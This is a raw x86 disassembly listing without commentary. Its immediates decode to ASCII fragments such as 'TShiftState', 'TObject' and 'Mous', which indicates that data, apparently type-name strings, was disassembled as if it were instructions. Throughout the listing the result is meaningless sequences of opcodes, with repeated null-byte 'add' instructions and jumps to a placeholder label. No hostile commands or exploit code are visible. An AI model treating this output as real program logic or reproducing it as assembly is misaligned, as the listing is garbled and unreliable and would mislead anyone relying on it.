jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_3aaa06c
in al 0xaa
add eax [ ecx ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
dec ebp
popad
js r-xdata
jb r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
hlt
cmpsd [ esi ] [ edi ]
add edi esp
salc
stosd [ edi ]
add esi [ eax + ebx * 8 - 0x55 ]
add edx [ eax ]
xlat
stosd [ edi ]
add esi [ eax - 0x2a ]
stosd [ edi ]
add ecx [ eax ]
push esp
dec ebp
popad
jb r-xdata
imul ebp [ esi + 0x53 ] 0x5657a69
add [ eax ] al
add [ eax ] al
mov al [ 0x1003aa ]
imul ebp [ esi + 0x73 ] 0x6400408d
mov eax [ 0x80703aa ]
push esp
dec ebp
popad
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ecx ] al
add [ ebx ] al
push esp
outsd
jo r-xdata
mov al [ 0x1403aa ]
add bh bh
xor bh dl
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx ] al
add [ esi ] al
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add al [ eax ]
add eax 0x68676952
imul ebp [ esi + 0x73 ] r-xdata
add al 0x7d
cmpsd [ esi ] [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add al 0x4c
outsb
lea eax [ bx + si ]
jl r-xdata
outsd
insd
lea eax [ eax ]
push eax
mov [ 0x3aa ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc edx
outsd
je r-xdata
add eax [ eax ]
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add eax [ eax ]
push es
outsd
insb
jae r-xdata
jge r-xdata
mov al [ 0xc03aa ]
add bh bh
xor bh dl
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
mov [ 0x2003aa ] al
add [ eax ] al
in al dx
imul ebp [ fs : esi + 0x67 ] r-xdata
pushad
stosb [ edi ]
add eax [ edi ]
or [ eax + edx * 2 + 0x61 ] dl
add bh bh
xor bh dl
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx ] al
add [ 0x68676952 ] al
add [ eax ] al
add [ eax ] eax
add edx [ edi + ebp * 2 + 0x70 ]
shl [ eax + 0x1003aa ] 0x1
mov al [ 0x45c803aa ]
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ edx + ebp * 4 - 0x294bfc59 ]
stosd [ edi ]
add edi [ ebx + ebp * 4 - 0x552ffc59 ]
cmpsd [ esi ] [ edi ]
add edi esp
salc
stosd [ edi ]
add esi [ eax + ebx * 8 - 0x55 ]
add edi [ eax ]
fisubr [ ebx - 0x54298ffd ]
add ecx [ eax ]
push esp
push eax
popad
imul ebp [ fs : esi + 0x67 ] 0x7c00408d
mov [ 0x80703aa ] al
push esp
push eax
popad
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x56 ] ch
add esp [ eax ]
add [ eax ] al
add ah ch
je r-xdata
add ecx [ eax ]
add [ eax ] al
push [ eax ]
xlat
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 2 ] al
add al dl
mov al [ 0x803aa ]
add bh bh
xor bh dl
aam 0x45
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ edx + ebp * 4 - 0x294bfc59 ]
stosd [ edi ]
add edi [ ebx + ebp * 4 - 0x552ffc59 ]
add eax [ eax + eax ]
or [ ebx + 0x6f ] al
outsb
je r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
outsd
insb
jae r-xdata
adc [ esi - 0x59efc3fd ] ah
outsd
insd
lea eax [ eax ]
and [ ebx + 0xb0803aa ] ah
push esp
dec ebp
outsd
jne r-xdata
add ecx [ eax ]
add [ eax ] al
push [ eax ]
xlat
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 2 ] al
add al dl
mov al [ 0x803aa ]
add bh bh
xor bh dl
pop es
or [ esi ] al
push ebx
outsb
jb r-xdata
dec ebp
outsd
jbe r-xdata
jne r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
mov eax [ 0x403aa ]
or [ ebx + 0x6f ] al
outsb
je r-xdata
mov al [ 0xc03aa ]
add bh bh
xor bh dl
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
popad
je r-xdata
inc ebp
jbe r-xdata
add ecx [ ebx - 0x555c6740 ]
add ecx [ eax ]
andps xmm1 [ ebp + 0x6f ]
cmpsb [ esi ] [ edi ]
outsb
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x4c
mov al [ 0x1003aa ]
add bh bh
xor bh dl
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ 0x68676952 ] al
je r-xdata
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
je r-xdata
jb r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
add eax 0x65530608
outsb
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ ebx ] al
push esp
outsd
jo r-xdata
inc edx
outsd
je r-xdata
mov al [ 0x1403aa ]
add bh bh
xor bh dl
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ esi ] al
or [ esi ] cl
push esp
dec ebx
jns r-xdata
jbe r-xdata
js r-xdata
outsb
or al 0x54
dec ebp
outsd
or eax 0x73756f4d
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
add [ ebx ] eax
outsb
je r-xdata
add [ edx ] al
or [ esi ] al
cmpsd [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edx eax
inc edx
popad
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx + edx ] dl
push cs
push esp
dec ebp
outsd
jne r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
push ebx
push 0xb746669
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add ebp [ eax ]
adc [ esi + 0x408d03 ] ah
cmp al 0xa5
stosb [ edi ]
add ecx [ eax ]
push cs
push esp
inc ebx
push 0x14007261
adc [ esi - 0x59efd7fd ] esp
add ecx [ ebp - 0x5ac3ffc0 ]
add ecx [ eax ]
push es
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
rcr [ ebp + 0x408d03aa ] 0x1
add [ esp + 0x90803aa ] dh
push esp
dec ebx
je r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
add ebp [ eax + 0x10 ]
add [ ecx + edx ] dl
add edx [ eax + r-xdata ]
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ ecx ] al
push esp
push ebx
dec ebp
outsd
jne r-xdata
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add edx [ ecx + edx ]
dec edi
jbe r-xdata
add [ ebx ] eax
dec ebx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
add ecx [ ebp - 0x5b4bffc0 ]
adc [ esi - 0x55622ffd ] ah
outsb
add [ 0x66696853 ] al
je r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
cmpsb [ esi ] [ edi ]
add edi [ eax + 0x75 ]
cmpsd [ esi ] [ edi ]
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add edx [ eax + 0x7803aa9d ]
jne r-xdata
push 0xb746669
jb r-xdata
jne r-xdata
je r-xdata
inc edx
jne r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
je r-xdata
inc esp
jb r-xdata
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
adc al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
add [ ecx ] al
push esp
push ebx
push 0x53746669
pop eax
pop es
dec ecx
outsb
je r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
popfd
stosb [ edi ]
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
push 0x53746669
je r-xdata
je r-xdata
adc al 0x11
cmpsb [ esi ] [ edi ]
add esp [ edi + edx * 4 - 0x5993fc56 ]
stosb [ edi ]
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
inc esp
jb r-xdata
jns r-xdata
jb r-xdata
stosb [ edi ]
add ecx [ eax ]
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
mov ah 0xa4
je r-xdata
push ebx
jb r-xdata
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
je r-xdata
je r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ esi + ebx * 4 - 0x56 ]
add eax [ eax ]
adc [ esi - 0x5a3b6ffd ] ah
stosb [ edi ]
add ecx [ eax ]
push cs
push esp
inc esp
jb r-xdata
cmp al 0x10
outsb
je r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
adc al 0x11
cmpsb [ esi ] [ edi ]
add edi [ eax + 0x75 ]
cmpsd [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add ecx [ ebp - 0x5c03ffc0 ]
stosb [ edi ]
add ecx [ eax ]
adc edx [ ebp + ecx * 2 + 0x6f ]
jne r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
push ebx
outsb
jb r-xdata
jb r-xdata
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
cmpsb [ esi ] [ edi ]
adc al 0x11
cmpsb [ esi ] [ edi ]
add edx [ ecx + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add ecx [ ebp - 0x59dbffc0 ]
stosb [ edi ]
add ecx [ eax ]
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
adc [ esi - 0x59efc3fd ] esp
pop es
inc edx
outsd
outsd
insb
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ esi - 0x59efc3fd ] esp
add ecx [ eax ]
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x14 ] si
adc [ esi - 0x55685bfd ] esp
add ebp [ esi - 0x56 ]
push ebx
outsb
add al 0x8
push es
pop es
dec eax
imul esi [ esp + edx * 2 + 0x65 ] 0x49077473
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
adc al 0x11
cmpsb [ esi ] [ edi ]
add ecx [ eax - 0x66 ]
stosb [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add ecx [ ebp - 0x58cfffc0 ]
stosb [ edi ]
add ecx [ eax ]
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add ecx eax
cmpsb [ esi ] [ edi ]
stosb [ edi ]
add ecx [ eax ]
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
adc al 0x11
cmpsb [ esi ] [ edi ]
add edx [ ecx + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
jns r-xdata
jb r-xdata
je r-xdata
jb r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] dl
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
adc al 0x11
cmpsb [ esi ] [ edi ]
add edx [ eax + 0x7803aa9d ]
jne r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
jb r-xdata
push es
push ebx
outsb
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
cmpsb [ esi ] [ edi ]
add ecx [ eax - 0x66 ]
stosb [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ esi + ebx * 4 - 0x56 ]
add eax [ eax ]
adc [ esi - 0x583f6ffd ] ah
stosb [ edi ]
add ecx [ eax ]
or al 0x54
adc al 0x11
outsb
je r-xdata
inc ebx
jpe r-xdata
outsb
push edx
jae r-xdata
sub [ esi + 0x3aa ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add ecx [ ebx - 0x5556fb40 ]
add ecx [ eax ]
andps xmm0 [ ebx + 0x61 ]
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x14 ] si
adc [ esi - 0x5565b7fd ] esp
add edi [ eax - 0x58 ]
stosb [ edi ]
add ecx [ eax ]
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
add [ eax ] al
add [ eax ] al
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add ecx [ ebx - 0x55557340 ]
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add ebp [ eax ]
scasb [ edi ]
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ esi + 0x4c08b03 ] ah
test eax 0xf0803aa
push esp
inc ebx
popad
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add ebp [ eax ]
scasb [ edi ]
stosb [ edi ]
add edx esp
mov bh 0xaa
add eax [ eax ]
adc [ esi - 0x5557d3fd ] ah
add ecx [ eax ]
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add ecx [ eax ]
push ss
push esp
dec ebp
outsd
jne r-xdata
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
adc [ esi - 0x733f74fd ] ah
stosb [ edi ]
stosb [ edi ]
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add ecx [ ebx - 0x5555fb40 ]
add ecx [ eax ]
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ esi - 0x59efc3fd ] ah
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x54 ] cl
stosb [ edi ]
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
adc al 0x11
cmpsb [ esi ] [ edi ]
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add edi [ eax + edx ]
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add esp [ edx + edx ]
stosd [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add [ eax ] al
sbb al 0x8b
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add esi eax
cmp eax 0x45d403a8
jo r-xdata
cmpsd [ esi ] [ edi ]
add [ ebx + ecx * 4 ] bl
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
adc [ esi + 0x408d03 ] ah
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add edi [ eax + 0x75 ]
cmpsd [ esi ] [ edi ]
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add eax [ eax ]
adc [ esi + 0x408d03 ] ah
je r-xdata
movsb [ edi ] [ esi ]
stosd [ edi ]
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 4 ] dh
stosb [ edi ]
add ebp [ esi + ebp * 4 ]
stosb [ edi ]
add eax [ eax ]
lea eax [ eax ]
jbe r-xdata
add ebx [ esi ]
scasb [ edi ]
stosb [ edi ]
add edx [ eax + 0x1c000001 ]
mov esp [ edi - 0x57c20ffd ]
add edx esp
inc ebp
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add edi [ eax + 0x75 ]
cmpsd [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
adc [ esi - 0x5554fffd ] ah
add ecx [ eax ]
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
jb r-xdata
outsb
stosb [ edi ]
add ecx [ eax ]
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add esp eax
0x235c03aa 0x3ab
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_3aaa0f0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax [ fs : 0x3aa ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
mov eax [ 0x2003aa ]
add [ eax ] al
nop
jl r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ebp + 0x69 ] cl
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0xd400408d
mov al [ 0xb0103aa ]
push esp
dec ebp
popad
jb r-xdata
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsd [ esi ] [ edi ]
add edi esp
salc
stosd [ edi ]
add esi [ eax + ebx * 8 - 0x55 ]
add edx [ eax ]
xlat
stosd [ edi ]
add esi [ eax - 0x2a ]
stosd [ edi ]
add ecx [ eax ]
push esp
dec ebp
popad
jb r-xdata
imul ebp [ esi + 0x53 ] 0x5657a69
add [ eax ] al
add [ eax ] al
mov al [ 0x1003aa ]
imul ebp [ esi + 0x73 ] 0x6400408d
mov eax [ 0x80703aa ]
push esp
dec ebp
popad
jb r-xdata
add [ ecx ] al
